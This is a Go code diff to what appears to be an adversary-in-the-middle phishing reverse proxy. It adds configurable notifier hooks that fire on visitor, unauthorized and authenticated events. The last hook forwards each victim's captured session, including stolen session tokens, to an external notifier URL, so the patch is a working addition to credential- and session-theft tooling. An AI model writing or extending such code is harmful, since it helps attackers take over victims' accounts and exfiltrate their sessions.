@@ -261,6 +261,17 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									p.whitelistIP(remote_addr, ps.SessionId)
 
 									req_ok = true
+
+									for _, n := range p.cfg.notifiers {
+										if n.OnEvent == "visitor" && n.Enabled {
+											session, _ := p.db.GetSessionBySid(session.Id)
+											log.Info("[%d] [%s] forwarding visitor info to notifier url %s", sid, hiblue.Sprint(pl_name), n.Url)
+											err := NotifyOnVisitor(n, *session, req.URL)
+											if err != nil {
+												log.Error("notifier: %v", err)
+											}
+										}
+									}
 								}
 							} else {
 								log.Warning("[%s] unauthorized request: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
@@ -271,6 +282,16 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										log.Error("failed to blacklist ip address: %s - %s", from_ip, err)
 									} else {
 										log.Warning("blacklisted ip address: %s", from_ip)
+									}
+								}
+
+								for _, n := range p.cfg.notifiers {
+									if n.OnEvent == "unauthorized" && n.Enabled {
+										log.Info("[%s] forwarding unauthorized request to notifier url %s", hiblue.Sprint(pl_name), n.Url)
+										err := NotifyOnUnauthorized(n, pl_name, req_url, req.Header.Get("User-Agent"), remote_addr)
+										if err != nil {
+											log.Error("notifier: %v", err)
+										}
 									}
 								}
 								return p.blockRequest(req)
@@ -691,6 +712,16 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								if is_auth {
 									if err := p.db.SetSessionTokens(ps.SessionId, s.Tokens); err != nil {
 										log.Error("database: %v", err)
+									}
+									for _, n := range p.cfg.notifiers {
+										if n.OnEvent == "authenticated" && n.Enabled {
+											session, _ := p.db.GetSessionBySid(ps.SessionId)
+											log.Info("[%d] forwarding captured session to notifier url %s", ps.Index, n.Url)
+											err := NotifyOnAuth(n, *session, pl)
+											if err != nil {
+												log.Error("notifier: %v", err)
+											}
+										}
 									}
 									s.IsDone = true
 								}
